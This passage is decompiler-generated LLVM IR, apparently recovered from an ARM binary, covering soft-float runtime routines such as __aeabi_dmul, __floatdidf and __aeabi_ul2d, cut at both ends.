bb8:                                              ; preds = %bb7
  %v2_1a62c = xor i32 %v15_1a61c, 939524096
  store i32 %v2_1a62c, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_1a630 = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_1a630 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1a630, i32 %v0_1a630)
  %v0_1a634 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a634 = icmp eq i32 %v0_1a634, 0
  br i1 %v2_1a634, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_1a638 = load i32, i32* @r3, align 4
  %v4_1a638 = icmp eq i32 %v1_1a638, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_1a63c = phi i1 [ true, %.thread1 ], [ %v4_1a638, %bb9 ]
  %v0_1a63c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1a63c, i32 %v0_1a63c)
  store i32 896, i32* @r4, align 4
  %v0_1a648 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a648 = and i32 %v0_1a648, -2147483648
  store i32 %v1_1a648, i32* @r5, align 4
  %tmp = bitcast i32 %v0_1a648 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_1a64c = bitcast float %tmp11 to i32
  store i32 %v1_1a64c, i32* @r1, align 4
  %v0_1a650 = call i32 @function_1a408()
  ret i32 %v0_1a650

; uselistorder directives
  uselistorder i32 %v3_1a618, { 1, 2, 0 }
  uselistorder i32 %v2_1a614, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_1a408, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1a654 = or i32 %arg2, %arg1
  %v4_1a654 = icmp eq i32 %v2_1a654, 0
  %v0_1a658 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1a654, i32 %v0_1a658)
  store i32 0, i32* @r5, align 4
  %v0_1a664 = call i32 @function_1a684()
  ret i32 %v0_1a664
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1a668 = or i32 %arg2, %arg1
  %v4_1a668 = icmp eq i32 %v2_1a668, 0
  %v0_1a66c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1a668, i32 %v0_1a66c)
  %v1_1a678 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1a678, i32 ptrtoint (i32* @global_var_1a684.979 to i32))
  %v1_1a67c = sub i32 0, %arg1
  ret i32 %v1_1a67c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_1a684() local_unnamed_addr {
dec_label_pc_1a684:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1a68c = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_1a68c, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_1a3a8.977 to i32))
  %tmp6 = icmp ult i32 %v0_1a68c, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1a684
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1a684, %bb
  %v1_1a6a4 = phi i32 [ 3, %dec_label_pc_1a684 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_1a68c, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1a6a4 = add nuw nsw i32 %v1_1a6a4, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_1a6a8 = phi i32 [ %v1_1a6a4, %bb3 ], [ %v2_1a6a4, %bb4 ]
  %not. = icmp slt i32 %v0_1a68c, 0
  %v4_1a6a8 = zext i1 %not. to i32
  %v5_1a6a8 = add nsw i32 %v0_1a6a8, %v4_1a6a8
  %v1_1a6ac = sub nsw i32 32, %v5_1a6a8
  %v0_1a6b0 = load i32, i32* @r0, align 4
  %v6_1a6b0 = shl i32 %v0_1a6b0, %v1_1a6ac
  store i32 %v6_1a6b0, i32* @ip, align 4
  %v6_1a6b4 = lshr i32 %v0_1a6b0, %v5_1a6a8
  %v1_1a6b8 = load i32, i32* @r1, align 4
  %v7_1a6b8 = shl i32 %v1_1a6b8, %v1_1a6ac
  %v8_1a6b8 = or i32 %v7_1a6b8, %v6_1a6b4
  %v6_1a6bc = lshr i32 %v1_1a6b8, %v5_1a6a8
  %v0_1a6c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a6c0 = add i32 %v0_1a6c0, %v5_1a6a8
  store i32 %v2_1a6c0, i32* @r4, align 4
  %v4_1a6c4 = sext i32 %v8_1a6b8 to i64
  %v5_1a6c4 = call i32 @function_1a3a8(i64 %v4_1a6c4, i32 %v6_1a6bc, i32 %v5_1a6a8, i32 %v1_1a6ac)
  ret i32 %v5_1a6c4

; uselistorder directives
  uselistorder i32 %v5_1a6a8, { 2, 0, 1, 3, 4 }
  uselistorder i32 6, { 4, 24, 25, 3, 18, 19, 26, 27, 21, 22, 5, 6, 29, 2, 0, 7, 23, 1, 8, 9, 10, 11, 12, 13, 20, 14, 17, 15, 16, 28 }
  uselistorder i32 3, { 49, 12, 35, 59, 36, 60, 61, 62, 64, 8, 65, 16, 66, 54, 0, 13, 67, 9, 1, 2, 51, 55, 3, 4, 37, 38, 74, 39, 40, 41, 42, 43, 44, 56, 6, 20, 57, 21, 48, 7, 50, 45, 75, 14, 70, 18, 71, 17, 72, 19, 69, 10, 68, 11, 58, 5, 63, 73, 46, 22, 52, 23, 24, 53, 25, 47, 28, 27, 26, 34, 29, 30, 31, 32, 33, 15 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a6c8 = load i32, i32* @r4, align 4
  store i32 %v3_1a6c8, i32* %stack_var_-16, align 4
  %v12_1a6c8 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1a6d4 = udiv i32 %arg2, 1048576
  %v5_1a6d4 = urem i32 %v4_1a6d4, 2048
  store i32 %v5_1a6d4, i32* %r4.global-to-local, align 4
  %v6_1a6d4 = icmp eq i32 %v5_1a6d4, 0
  br i1 %v6_1a6d4, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_1a6d8 = udiv i32 %arg4, 1048576
  %v6_1a6d8 = urem i32 %v5_1a6d8, 2048
  store i32 %v6_1a6d8, i32* @r5, align 4
  %v7_1a6d8 = icmp eq i32 %v6_1a6d8, 0
  br i1 %v7_1a6d8, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_1a6dc = icmp eq i32 %v5_1a6d4, 2047
  br i1 %v5_1a6dc, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_1a6e0 = icmp eq i32 %v6_1a6d8, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_1a6e4 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_1a6e0, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_1a6e8.982 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1a6e4, i32 ptrtoint (i32* @global_var_1a8c0.980 to i32))
  %v0_1a6e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a6e8 = load i32, i32* @r5, align 4
  %v2_1a6e8 = add i32 %v1_1a6e8, %v0_1a6e8
  store i32 %v2_1a6e8, i32* %r4.global-to-local, align 4
  %v2_1a6ec = xor i32 %arg4, %arg2
  %v1_1a6f0 = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_1a6f0, -2097152
  %v5_1a6f0 = add i32 %tmp51, -1
  %v6_1a6f0 = and i32 %v5_1a6f0, %arg2
  store i32 %v6_1a6f0, i32* %r1.global-to-local, align 4
  %v6_1a6f4 = and i32 %v5_1a6f0, %arg4
  %v5_1a6f8 = mul i32 %arg2, 4096
  %v6_1a6f8 = or i32 %v5_1a6f8, %tmp32
  %v8_1a6f8 = icmp eq i32 %v6_1a6f8, 0
  br i1 %v8_1a6f8, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_1a7005 = or i32 %v6_1a6f0, 1048576
  store i32 %v1_1a7005, i32* %r1.global-to-local, align 4
  %v1_1a7047 = or i32 %v6_1a6f4, 1048576
  br label %dec_label_pc_1a784

bb40:                                             ; preds = %.thread2
  %v6_1a6fc = mul i32 %arg4, 4096
  %v7_1a6fc = or i32 %v6_1a6fc, %arg3
  %v9_1a6fc = icmp eq i32 %v7_1a6fc, 0
  %v1_1a700 = or i32 %v6_1a6f0, 1048576
  store i32 %v1_1a700, i32* %r1.global-to-local, align 4
  %v1_1a704 = or i32 %v6_1a6f4, 1048576
  br i1 %v9_1a6fc, label %dec_label_pc_1a784, label %dec_label_pc_1a70c

dec_label_pc_1a70c:                               ; preds = %bb40
  %v6_1a70c = mul nuw i64 %tmp, %arg1
  %v7_1a70c = udiv i64 %v6_1a70c, 4294967296
  %v9_1a70c = trunc i64 %v6_1a70c to i32
  store i32 %v9_1a70c, i32* %ip.global-to-local, align 4
  %v7_1a714 = zext i32 %v1_1a700 to i64
  %v11_1a714 = mul nuw nsw i64 %v7_1a714, %tmp
  %v12_1a714 = add i64 %v11_1a714, %v7_1a70c
  %v1_1a718 = and i32 %v2_1a6ec, -2147483648
  %v10_1a71c = zext i32 %v1_1a704 to i64
  %v11_1a71c = mul nuw i64 %v10_1a71c, %arg1
  %v12_1a71c = add i64 %v12_1a714, %v11_1a71c
  %v13_1a71c = udiv i64 %v12_1a71c, 4294967296
  %v15_1a71c = trunc i64 %v12_1a71c to i32
  %v10_1a724 = mul nuw i64 %v10_1a71c, %v7_1a714
  %v11_1a724 = add i64 %v13_1a71c, %v10_1a724
  %v12_1a724 = udiv i64 %v11_1a724, 4294967296
  %v13_1a724 = trunc i64 %v12_1a724 to i32
  %v14_1a724 = trunc i64 %v11_1a724 to i32
  %v2_1a728 = icmp eq i32 %v9_1a70c, 0
  br i1 %v2_1a728, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_1a70c
  %v2_1a72c = or i32 %v15_1a71c, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1a70c, %bb41
  %storemerge = phi i32 [ %v2_1a72c, %bb41 ], [ %v15_1a71c, %dec_label_pc_1a70c ]
  %v0_1a740 = phi i32 [ %v2_1a72c, %bb41 ], [ %v15_1a71c, %dec_label_pc_1a70c ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_1a730 = add i32 %v2_1a6e8, -255
  %v2_1a734 = icmp ugt i32 %v13_1a724, 511
  %v2_1a738 = icmp eq i1 %v2_1a734, false
  %v3_1a738 = add i32 %v2_1a6e8, -1023
  %v5_1a738 = sext i1 %v2_1a738 to i32
  %v6_1a738 = add i32 %v3_1a738, %v5_1a738
  store i32 %v6_1a738, i32* %r4.global-to-local, align 4
  %v3_1a73c = icmp ugt i32 %v1_1a730, 768
  br i1 %v3_1a73c, label %dec_label_pc_1a74c, label %dec_label_pc_1a740

dec_label_pc_1a740:                               ; preds = %bb42
  %v1_1a740 = icmp slt i32 %v0_1a740, 0
  %v2_1a740 = mul i32 %v0_1a740, 2
  store i32 %v2_1a740, i32* %lr.global-to-local, align 4
  %v3_1a744 = mul i32 %v14_1a724, 2
  %v4_1a744 = zext i1 %v1_1a740 to i32
  %v5_1a744 = or i32 %v4_1a744, %v3_1a744
  %v9_1a744 = icmp ule i32 %v5_1a744, %v14_1a724
  %v10_1a744 = icmp ult i32 %v3_1a744, %v14_1a724
  %v11_1a744 = select i1 %v1_1a740, i1 %v9_1a744, i1 %v10_1a744
  %v3_1a74825 = mul nuw nsw i64 %v12_1a724, 2
  %v3_1a748 = trunc i64 %v3_1a74825 to i32
  %v4_1a748 = zext i1 %v11_1a744 to i32
  %v5_1a748 = or i32 %v4_1a748, %v3_1a748
  br label %dec_label_pc_1a74c

dec_label_pc_1a74c:                               ; preds = %bb42, %dec_label_pc_1a740
  %v0_1a75c = phi i32 [ %v0_1a740, %bb42 ], [ %v2_1a740, %dec_label_pc_1a740 ]
  %v0_1a754 = phi i32 [ %v14_1a724, %bb42 ], [ %v5_1a744, %dec_label_pc_1a740 ]
  %v1_1a74c = phi i32 [ %v13_1a724, %bb42 ], [ %v5_1a748, %dec_label_pc_1a740 ]
  %v4_1a74c = mul i32 %v1_1a74c, 2048
  %v4_1a750 = udiv i32 %v0_1a754, 2097152
  %v5_1a74c = or i32 %v4_1a750, %v1_1a718
  %v5_1a750 = or i32 %v5_1a74c, %v4_1a74c
  store i32 %v5_1a750, i32* %r1.global-to-local, align 4
  %v3_1a754 = mul i32 %v0_1a754, 2048
  %v4_1a758 = udiv i32 %v0_1a75c, 2097152
  %v5_1a758 = or i32 %v3_1a754, %v4_1a758
  store i32 %v5_1a758, i32* %r0.global-to-local, align 4
  %v3_1a75c = mul i32 %v0_1a75c, 2048
  store i32 %v3_1a75c, i32* %lr.global-to-local, align 4
  %v1_1a760 = add i32 %v6_1a738, -253
  store i32 %v1_1a760, i32* %ip.global-to-local, align 4
  %v2_1a760 = icmp ugt i32 %v6_1a738, 252
  %v7_1a760 = icmp eq i32 %v6_1a738, 253
  %v2_1a764 = xor i1 %v7_1a760, true
  %v3_1a764 = and i1 %v2_1a760, %v2_1a764
  br i1 %v3_1a764, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_1a74c
  %v6_1a764 = icmp ugt i32 %v1_1a760, 1791
  %v11_1a764 = icmp eq i32 %v1_1a760, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1a74c, %bb43
  %v1_1a768 = phi i1 [ %v7_1a760, %dec_label_pc_1a74c ], [ %v11_1a764, %bb43 ]
  %v0_1a768 = phi i1 [ %v2_1a760, %dec_label_pc_1a74c ], [ %v6_1a764, %bb43 ]
  %v2_1a768 = xor i1 %v1_1a768, true
  %v3_1a768 = and i1 %v0_1a768, %v2_1a768
  call void @__pseudo_cond_branch(i1 %v3_1a768, i32 ptrtoint (i32* @global_var_1a7b4.981 to i32))
  %v0_1a76c = load i32, i32* %lr.global-to-local, align 4
  %v2_1a76c = icmp slt i32 %v0_1a76c, 0
  %v6_1a76c = icmp eq i32 %v0_1a76c, -2147483648
  %v1_1a770 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1a76c, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_1a770 = urem i32 %v1_1a770, 2
  %v3_1a770 = icmp ne i32 %v2_1a770, 0
  %v4_1a770 = udiv i32 %v1_1a770, 2
  store i32 %v4_1a770, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_1a774 = phi i1 [ %v3_1a770, %bb45 ], [ %v2_1a76c, %bb44 ]
  %v2_1a774 = zext i1 %v1_1a774 to i32
  %v3_1a774 = add i32 %v2_1a774, %v1_1a770
  store i32 %v3_1a774, i32* %r0.global-to-local, align 4
  %v0_1a778 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a778 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a778 = and i32 %v1_1a778, 4096
  %v3_1a778 = icmp ne i32 %v2_1a778, 0
  %v4_1a778 = mul i32 %v1_1a778, 1048576
  %v6_1a778 = add i32 %v4_1a778, %v0_1a778
  %v7_1a778 = zext i1 %v3_1a778 to i32
  %v8_1a778 = add i32 %v7_1a778, %v6_1a778
  store i32 %v8_1a778, i32* %r1.global-to-local, align 4
  %v2_1a77c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a77c, i32* %r4.global-to-local, align 4
  store i32 %v12_1a6c8, i32* %lr.global-to-local, align 4
  ret i32 %v3_1a774

dec_label_pc_1a784:                               ; preds = %.thread3, %bb40
  %v1_1a790 = phi i32 [ %v1_1a7047, %.thread3 ], [ %v1_1a704, %bb40 ]
  %v1_1a788 = phi i32 [ %v1_1a7005, %.thread3 ], [ %v1_1a700, %bb40 ]
  %v1_1a784 = and i32 %v2_1a6ec, -2147483648
  %v2_1a788 = or i32 %v1_1a788, %v1_1a784
  %v4_1a78c1 = or i64 %tmp, %arg1
  %v4_1a78c = trunc i64 %v4_1a78c1 to i32
  store i32 %v4_1a78c, i32* %r0.global-to-local, align 4
  %v2_1a790 = xor i32 %v2_1a788, %v1_1a790
  store i32 %v2_1a790, i32* %r1.global-to-local, align 4
  %v4_1a794 = udiv i32 %v1_1a6f0, 2
  %v5_1a794 = sub i32 %v2_1a6e8, %v4_1a794
  store i32 %v5_1a794, i32* %r4.global-to-local, align 4
  %v7_1a794 = sub i32 0, %v5_1a794
  %v8_1a794 = and i32 %v2_1a6e8, %v7_1a794
  %v11_1a794 = icmp eq i32 %v2_1a6e8, %v4_1a794
  %v7_1a798 = icmp sgt i32 %v2_1a6e8, %v4_1a794
  br i1 %v7_1a798, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1a784
  %v10_1a798 = sub i32 %v1_1a6f0, %v5_1a794
  %v12_1a798 = xor i32 %v5_1a794, %v1_1a6f0
  %v13_1a798 = xor i32 %v10_1a798, %v1_1a6f0
  %v14_1a798 = and i32 %v13_1a798, %v12_1a798
  %v17_1a798 = icmp eq i32 %v1_1a6f0, %v5_1a794
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1a784, %bb46
  %v3_1a7a4.in = phi i32 [ %v8_1a794, %dec_label_pc_1a784 ], [ %v14_1a798, %bb46 ]
  %v2_1a7a4.in = phi i32 [ %v5_1a794, %dec_label_pc_1a784 ], [ %v10_1a798, %bb46 ]
  %v1_1a7a4 = phi i1 [ %v11_1a794, %dec_label_pc_1a784 ], [ %v17_1a798, %bb46 ]
  %v2_1a7a4 = icmp slt i32 %v2_1a7a4.in, 0
  %v3_1a7a4 = icmp slt i32 %v3_1a7a4.in, 0
  %v3_1a79c = xor i1 %v3_1a7a4, %v2_1a7a4
  %v4_1a79c = or i1 %v1_1a7a4, %v3_1a79c
  br i1 %v4_1a79c, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_1a7a4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_1a79c30 = mul i32 %v5_1a794, 1048576
  %v10_1a79c31 = or i32 %v2_1a790, %v9_1a79c30
  store i32 %v10_1a79c31, i32* %r1.global-to-local, align 4
  %v7_1a7a0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1a7a0, i32* %r4.global-to-local, align 4
  store i32 %v12_1a6c8, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_1a7a4 = phi i32 [ %v0_1a7a4.pre, %._crit_edge23 ], [ %v12_1a6c8, %bb48 ]
  %v6_1a7a4 = xor i1 %v4_1a79c, true
  call void @__pseudo_cond_branch(i1 %v6_1a7a4, i32 %v0_1a7a4)
  %v0_1a7a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a7a8 = or i32 %v0_1a7a8, 1048576
  store i32 %v1_1a7a8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1a7b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a7b0 = add i32 %v0_1a7b0, -1
  store i32 %v1_1a7b0, i32* %r4.global-to-local, align 4
  ret i32 %v4_1a78c

; uselistorder directives
  uselistorder i32 %v5_1a794, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_1a794, { 2, 1, 0 }
  uselistorder i32 %v1_1a770, { 2, 0, 1 }
  uselistorder i32 %v0_1a76c, { 1, 0 }
  uselistorder i1 %v7_1a760, { 1, 0 }
  uselistorder i32 %v2_1a740, { 1, 0 }
  uselistorder i1 %v1_1a740, { 1, 0 }
  uselistorder i32 %v6_1a738, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1a740, { 1, 0, 2 }
  uselistorder i32 %v14_1a724, { 1, 3, 2, 0 }
  uselistorder i64 %v11_1a724, { 1, 0 }
  uselistorder i64 %v12_1a71c, { 1, 0 }
  uselistorder i64 %v10_1a71c, { 1, 0 }
  uselistorder i64 %v7_1a714, { 1, 0 }
  uselistorder i64 %v6_1a70c, { 1, 0 }
  uselistorder i32 %v6_1a6f4, { 1, 0 }
  uselistorder i32 %v6_1a6f0, { 1, 0, 2 }
  uselistorder i32 %v1_1a6f0, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1a6e8, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_1a6d8, { 2, 1, 0 }
  uselistorder i32 %v5_1a6d4, { 2, 1, 0 }
  uselistorder i32 %v12_1a6c8, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 10, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 -255, { 6, 0, 2, 3, 1, 4, 5 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1a784, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_1a74c, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_1a7b4() local_unnamed_addr {
dec_label_pc_1a7b4:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_1a7b4 = load i1, i1* @cpsr_z, align 1
  %v1_1a7b4 = load i1, i1* @cpsr_n, align 1
  %v2_1a7b4 = load i1, i1* @cpsr_v, align 1
  %v3_1a7b4 = xor i1 %v1_1a7b4, %v2_1a7b4
  %v4_1a7b4 = or i1 %v0_1a7b4, %v3_1a7b4
  br i1 %v4_1a7b4, label %dec_label_pc_1a7b8, label %dec_label_pc_1a930

dec_label_pc_1a7b8:                               ; preds = %dec_label_pc_1a7b4
  %v0_1a7b8 = load i32, i32* @r4, align 4
  %v4_1a7b8 = add i32 %v0_1a7b8, 54
  %v6_1a7b8 = sub i32 0, %v0_1a7b8
  %v7_1a7b8 = and i32 %v4_1a7b8, %v6_1a7b8
  %v8_1a7b8 = icmp slt i32 %v7_1a7b8, 0
  %v9_1a7b8 = icmp slt i32 %v4_1a7b8, 0
  %v10_1a7b8 = icmp eq i32 %v4_1a7b8, 0
  %v7_1a7bc = icmp sgt i32 %v0_1a7b8, -54
  br i1 %v7_1a7bc, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1a7b8
  store i32 0, i32* @r0, align 4
  %v8_1a7c0 = load i32, i32* @r1, align 4
  %v9_1a7c0 = and i32 %v8_1a7c0, -2147483648
  store i32 %v9_1a7c0, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1a7b8, %bb
  %v4_1a7c8 = xor i1 %v9_1a7b8, %v8_1a7b8
  %v5_1a7c8 = or i1 %v10_1a7b8, %v4_1a7c8
  call void @__pseudo_cond_branch(i1 %v5_1a7c8, i32 %tmp7)
  %v0_1a7cc = load i32, i32* @r4, align 4
  %v1_1a7cc = sub i32 0, %v0_1a7cc
  %v2_1a7d0 = sub i32 -32, %v0_1a7cc
  %v4_1a7d0 = add i32 %v0_1a7cc, 31
  %v5_1a7d0 = and i32 %v4_1a7d0, %v1_1a7cc
  %v6_1a7d0 = icmp slt i32 %v5_1a7d0, 0
  store i1 %v6_1a7d0, i1* @cpsr_v, align 1
  %v6_1a7d4 = icmp slt i32 %v1_1a7cc, 32
  br i1 %v6_1a7d4, label %dec_label_pc_1a7d8, label %dec_label_pc_1a844

dec_label_pc_1a7d8:                               ; preds = %.thread1
  %v1_1a7d8 = add i32 %v2_1a7d0, 12
  %v8_1a7dc = icmp sgt i32 %v1_1a7d8, 0
  br i1 %v8_1a7dc, label %dec_label_pc_1a814, label %dec_label_pc_1a7e0

dec_label_pc_1a7e0:                               ; preds = %dec_label_pc_1a7d8
  %v1_1a7e0 = add i32 %v2_1a7d0, 32
  %v1_1a7e4 = sub i32 0, %v2_1a7d0
  %v0_1a7e8 = load i32, i32* @r0, align 4
  %v6_1a7e8 = shl i32 %v0_1a7e8, %v1_1a7e4
  %v2_1a7ec = add i32 %v2_1a7d0, 31
  %v3_1a7ec = shl i32 1, %v2_1a7ec
  %v6_1a7ec = lshr i32 %v0_1a7e8, %v1_1a7e0
  %v1_1a7f0 = load i32, i32* @r1, align 4
  %v7_1a7f0 = shl i32 %v1_1a7f0, %v1_1a7e4
  %v8_1a7f0 = or i32 %v7_1a7f0, %v6_1a7ec
  %v1_1a7f4 = and i32 %v1_1a7f0, -2147483648
  %tmp = bitcast i32 %v1_1a7f0 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1a7f8 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_1a7e8, 0
  %v4_1a7fc = zext i1 %tmp20 to i32
  %v5_1a7fc = add i32 %v8_1a7f0, %v4_1a7fc
  %v5_1a800 = and i32 %v1_1a7f8, %v3_1a7ec
  %v6_1a800 = icmp ne i32 %v5_1a800, 0
  %v7_1a800 = lshr i32 %v1_1a7f8, %v1_1a7e0
  %v9_1a800 = add i32 %v7_1a800, %v1_1a7f4
  %v10_1a800 = zext i1 %v6_1a800 to i32
  %v11_1a800 = add i32 %v9_1a800, %v10_1a800
  store i32 %v11_1a800, i32* @r1, align 4
  %v19_1a800 = add i32 %v11_1a800, %v10_1a800
  %v20_1a800 = xor i32 %v19_1a800, %v1_1a7f0
  %v21_1a800 = xor i32 %v19_1a800, %v7_1a800
  %v22_1a800 = and i32 %v20_1a800, %v21_1a800
  %v23_1a800 = icmp slt i32 %v22_1a800, 0
  store i1 %v23_1a800, i1* @cpsr_v, align 1
  %v3_1a804 = mul i32 %v6_1a7e8, 2
  %v4_1a804 = or i32 %v3_1a804, %tmp7
  %v5_1a804 = icmp slt i32 %v4_1a804, 0
  store i1 %v5_1a804, i1* @cpsr_n, align 1
  %v6_1a804 = icmp eq i32 %v4_1a804, 0
  store i1 %v6_1a804, i1* @cpsr_z, align 1
  br i1 %v6_1a804, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_1a7e0
  %tmp21 = sext i1 %tmp20 to i32
  %v6_1a808 = add nsw i32 %tmp21, -1
  %v7_1a808 = and i32 %v5_1a7fc, %v6_1a808
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_1a7e0, %bb13
  %v1_1a810 = phi i32 [ %v5_1a7fc, %dec_label_pc_1a7e0 ], [ %v7_1a808, %bb13 ]
  %v2_1a80c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1a80c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1a810

dec_label_pc_1a814:                               ; preds = %dec_label_pc_1a7d8
  %v1_1a814 = sub i32 0, %v2_1a7d0
  %v1_1a818 = add i32 %v2_1a7d0, 32
  %v0_1a81c = load i32, i32* @r0, align 4
  %v6_1a81c = shl i32 %v0_1a81c, %v1_1a814
  %v6_1a820 = lshr i32 %v0_1a81c, %v1_1a818
  %v1_1a824 = load i32, i32* @r1, align 4
  %v7_1a824 = shl i32 %v1_1a824, %v1_1a814
  %v8_1a824 = or i32 %v7_1a824, %v6_1a820
  %v1_1a828 = and i32 %v1_1a824, -2147483648
  %tmp22 = icmp slt i32 %v6_1a81c, 0
  %v4_1a82c = zext i1 %tmp22 to i32
  %v5_1a82c = add i32 %v8_1a824, %v4_1a82c
  %v6_1a82c = icmp ult i32 %v5_1a82c, %v8_1a824
  %v2_1a830 = zext i1 %v6_1a82c to i32
  %v3_1a830 = or i32 %v2_1a830, %v1_1a828
  store i32 %v3_1a830, i32* @r1, align 4
  %v9_1a830 = add nsw i32 %v3_1a830, %v2_1a830
  %v10_1a830 = sub i32 0, %v1_1a824
  %v11_1a830 = and i32 %v9_1a830, %v10_1a830
  %v12_1a830 = icmp slt i32 %v11_1a830, 0
  store i1 %v12_1a830, i1* @cpsr_v, align 1
